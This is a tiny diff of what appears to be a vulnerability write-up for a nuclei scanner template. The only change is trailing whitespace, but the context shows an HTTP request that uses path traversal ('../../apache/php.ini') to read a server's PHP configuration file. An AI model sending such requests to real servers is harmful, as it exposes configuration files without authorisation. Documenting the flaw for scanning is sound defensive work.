@@ -8,7 +8,7 @@
 
 ```http
 GET /pub/help2.php?key=../../apache/php.ini HTTP/1.1
-Host: 
+Host:
 ```
 
 #### nuclei
